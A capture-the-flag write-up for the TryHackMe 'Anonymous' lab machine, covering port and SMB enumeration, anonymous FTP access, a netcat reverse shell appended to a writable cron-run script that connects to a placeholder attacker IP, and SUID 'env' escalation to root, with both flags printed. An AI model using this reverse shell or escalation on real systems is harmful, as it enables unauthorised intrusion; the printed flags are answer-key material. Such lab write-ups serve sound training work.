# CTF Writeup: TryHackMe - Anonymous

## Challenge Description

Not the hacking group

Try to get the two flags!  Root the machine and prove your understanding of the fundamentals! This is a virtual machine meant for beginners. Acquiring both flags will require some basic knowledge of Linux and privilege escalation methods.

## Solution

### Reconnaissance

We can start by scanning the machine for open ports. Only thing really interesting here is the anonymous FTP login allowed and the smb server running.

```
$ nmap -sC -sV 10.10.61.234
Starting Nmap 7.60 ( https://nmap.org ) at 2023-02-02 21:36 GMT
Nmap scan report for ip-10-10-61-234.eu-west-1.compute.internal (10.10.61.234)
Host is up (0.055s latency).
Not shown: 988 closed ports
PORT      STATE    SERVICE     VERSION
21/tcp    open     ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.217.203
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp    open     ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)
|   256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA)
|_  256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (EdDSA)
139/tcp   open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open     netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
911/tcp   filtered xact-backup
1046/tcp  filtered wfremotertm
1296/tcp  filtered dproxy
2800/tcp  filtered acc-raid
3323/tcp  filtered active-net
3878/tcp  filtered fotogcad
8649/tcp  filtered unknown
19350/tcp filtered unknown
MAC Address: 02:15:FE:1C:5B:41 (Unknown)
Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: anonymous
|   NetBIOS computer name: ANONYMOUS\x00
|   Domain name: \x00
|   FQDN: anonymous
|_  System time: 2023-02-02T21:36:27+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-02-02 21:36:27
|_  start_date: 1600-12-31 23:58:45

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.46 seconds
```


1. Enumerate the machine.  How many ports are open?
> 4

2. What service is running on port 21?
> ftp

3. What service is running on ports 139 and 445?
> smb

Now let's investigate further using enum4linux. We notice an interesting share called pics and a user named namelessone.
```
$ enum4linux -a 10.10.61.234
...
 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.10.61.234
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ==================================================== 
|    Enumerating Workgroup/Domain on 10.10.61.234    |
 ==================================================== 
[+] Got domain/workgroup name: WORKGROUP

 ============================================ 
|    Nbtstat Information for 10.10.61.234    |
 ============================================ 
Looking up status of 10.10.61.234
	ANONYMOUS       <00> -         B <ACTIVE>  Workstation Service
	ANONYMOUS       <03> -         B <ACTIVE>  Messenger Service
	ANONYMOUS       <20> -         B <ACTIVE>  File Server Service
	..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
	WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
	WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
	WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

	MAC Address = 00-00-00-00-00-00

 ===================================== 
|    Session Check on 10.10.61.234    |
 ===================================== 
[+] Server 10.10.61.234 allows sessions using username '', password ''

 =========================================== 
|    Getting domain SID for 10.10.61.234    |
 =========================================== 
Domain Name: WORKGROUP
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 ====================================== 
|    OS information on 10.10.61.234    |
 ====================================== 
[+] Got OS info for 10.10.61.234 from smbclient: 
[+] Got OS info for 10.10.61.234 from srvinfo:
	ANONYMOUS      Wk Sv PrQ Unx NT SNT anonymous server (Samba, Ubuntu)
	platform_id     :	500
	os version      :	6.1
	server type     :	0x809a03

 ============================= 
|    Users on 10.10.61.234    |
 ============================= 
index: 0x1 RID: 0x3eb acb: 0x00000010 Account: namelessone	Name: namelessone	Desc: 

user:[namelessone] rid:[0x3eb]

 ========================================= 
|    Share Enumeration on 10.10.61.234    |
 ========================================= 
WARNING: The "syslog" option is deprecated

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	pics            Disk      My SMB Share Directory for Pics
	IPC$            IPC       IPC Service (anonymous server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            ANONYMOUS

[+] Attempting to map shares on 10.10.61.234
//10.10.61.234/print$	Mapping: DENIED, Listing: N/A
//10.10.61.234/pics	Mapping: OK, Listing: OK
//10.10.61.234/IPC$	[E] Can't understand response:
WARNING: The "syslog" option is deprecated
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*

...
 ======================================================================= 
|    Users on 10.10.61.234 via RID cycling (RIDS: 500-550,1000-1050)    |
 ======================================================================= 
[I] Found new SID: S-1-22-1
[I] Found new SID: S-1-5-21-2144577014-3591677122-2188425437
[I] Found new SID: S-1-5-32
[+] Enumerating users using SID S-1-5-32 and logon username '', password ''
...
S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)
...
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\namelessone (Local User)
[+] Enumerating users using SID S-1-5-21-2144577014-3591677122-2188425437 and logon username '', password ''
...
S-1-5-21-2144577014-3591677122-2188425437-1003 ANONYMOUS\namelessone (Local User)

enum4linux complete on Thu Feb  2 21:36:40 2023

```

4. There's a share on the user's computer.  What's it called?
> pics

Let's connect to the share and see what we can find.

```
$ smbclient -N \\\\10.10.61.234\\pics
WARNING: The "syslog" option is deprecated
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun May 17 12:11:34 2020
  ..                                  D        0  Thu May 14 02:59:10 2020
  corgo2.jpg                          N    42663  Tue May 12 01:43:42 2020
  puppos.jpeg                         N   265188  Tue May 12 01:43:42 2020

		20508240 blocks of size 1024. 13289984 blocks available
smb: \> get corgo2.jpg
getting file \corgo2.jpg of size 42663 as corgo2.jpg (527.4 KiloBytes/sec) (average 527.4 KiloBytes/sec)
smb: \> get puppos.jpeg
getting file \puppos.jpeg of size 265188 as puppos.jpeg (1618.6 KiloBytes/sec) (average 1257.9 KiloBytes/sec)
smb: \> ^C
```

No significant findings were obtained through the use of exiftool and binwalk to perform forensics on the two images.
```
$ exiftool corgo2.jpg
ExifTool Version Number         : 10.80
File Name                       : corgo2.jpg
Directory                       : .
File Size                       : 42 kB
File Modification Date/Time     : 2023:02:02 23:49:28+00:00
File Access Date/Time           : 2023:02:02 23:49:28+00:00
File Inode Change Date/Time     : 2023:02:02 23:49:28+00:00
File Permissions                : rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Profile CMM Type                : Unknown (lcms)
Profile Version                 : 2.1.0
Profile Class                   : Display Device Profile
Color Space Data                : RGB
Profile Connection Space        : XYZ
Profile Date Time               : 2012:01:25 03:41:57
Profile File Signature          : acsp
Primary Platform                : Apple Computer Inc.
CMM Flags                       : Not Embedded, Independent
Device Manufacturer             : 
Device Model                    : 
Device Attributes               : Reflective, Glossy, Positive, Color
Rendering Intent                : Perceptual
Connection Space Illuminant     : 0.9642 1 0.82491
Profile Creator                 : Unknown (lcms)
Profile ID                      : 0
Profile Description             : c2
Profile Copyright               : FB
Media White Point               : 0.9642 1 0.82491
Media Black Point               : 0.01205 0.0125 0.01031
Red Matrix Column               : 0.43607 0.22249 0.01392
Green Matrix Column             : 0.38515 0.71687 0.09708
Blue Matrix Column              : 0.14307 0.06061 0.7141
Red Tone Reproduction Curve     : (Binary data 64 bytes, use -b option to extract)
Green Tone Reproduction Curve   : (Binary data 64 bytes, use -b option to extract)
Blue Tone Reproduction Curve    : (Binary data 64 bytes, use -b option to extract)
Image Width                     : 800
Image Height                    : 533
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 800x533
Megapixels                      : 0.426

```

This brings us back to the FTP server that had anonymous login enabled.

```
$ ftp 10.10.61.234
Connected to 10.10.61.234.
220 NamelessOne's FTP Server!
Name (10.10.61.234:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts
226 Directory send OK.
ftp> cd scripts
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh
-rw-rw-r--    1 1000     1000         1634 Feb 02 23:58 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
226 Directory send OK.
ftp>
```

We notice that the file clean.sh is writeable.
```
ftp> get clean.sh
local: clean.sh remote: clean.sh
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for clean.sh (314 bytes).
226 Transfer complete.
314 bytes received in 0.00 secs (206.6311 kB/s)
ftp> exit
$ cat clean.sh
#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi
```

### Gaining Access

Knowing that the clean.sh is writeable and executed on the victim machine every minute, let's create a reverse shell.

```
$ echo 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc OUR_MACHINE_IP 4444 > /tmp/f' >> clean.sh
$ ftp 10.10.61.234
...
ftp> cd scripts
ftp> put clean.sh
ftp> exit
$ nc -lnvp 4444
Listening on [0.0.0.0] (family 0, port 4444)
Connection from 10.10.61.234 47252 received!
/bin/sh: 0: can't access tty; job control turned off
$ 
```

Now let's get a stabilized shell and get user.txt.

```
$ python -c 'import pty;pty.spawn("/bin/bash")'

namelessone@anonymous:~$ export TERM=xterm
export TERM=xterm

namelessone@anonymous:~$ ^Z
[1]+  Stopped                 nc -lnvp 4444

$ stty raw -echo; fg

$ [ENTER]

$ [ENTER]

namelessone@anonymous:~$
```

5. user.txt
> 90d6f992585815ff991e68748c414740


### Escalating Privileges

Let's look for programs with the SUID or SGID bit set and escalate privileges using known vulnerabilities with GTFObins to get the root flag.

```
namelessone@anonymous:~$ find / -type f -perm -04000 -ls 2>/tmp/NULL
...
  918992     36 -rwsr-xr-x   1 root     root               35000 Jan 18  2018 /usr/bin/env
...
namelessone@anonymous:~$ env /bin/sh -p
# whoami
root
# cat /root/root.txt
4d930091c31a622a7ed10f27999af363
```

6. root.txt
> 4d930091c31a622a7ed10f27999af363


## Commit
git add TryHackMe\ -\ Ice.md
git commit -m "Ice Looting"
git push -u origin master